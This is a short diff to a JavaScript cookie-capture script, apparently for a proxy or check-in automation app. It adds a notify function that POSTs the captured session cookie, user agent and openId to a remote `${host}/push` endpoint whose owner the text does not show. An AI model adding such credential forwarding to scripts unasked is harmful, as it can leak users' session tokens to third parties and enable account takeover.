@@ -58,6 +58,7 @@ async function GetCookie() {
             const key = cookie.match(/faiOpenId=.+?;/)
             const openId = key.toString().split('=')[1].replace(";","")
             var obj = {cookie, userAgent, openId}
+            await notify(obj)
             //$.notify("已捕获到请求!",'',JSON.stringify(obj))
             await run(obj)
         } else {
@@ -71,6 +72,16 @@ async function GetCookie() {
             )}\n\n${eor}\n\n${JSON.stringify($request.headers)}\n`,
         );
     }
+}
+
+/**
+ * 通知更新
+ */
+async function notify(ckVal) {
+    const body = {"source": "qiaopai", "value": ckVal}
+    const url = `${host}/push`
+    const options = {url, body}
+    $.http.post(options).then((response) => JSON.parse(response.body))
 }
 
 async function run(account) {
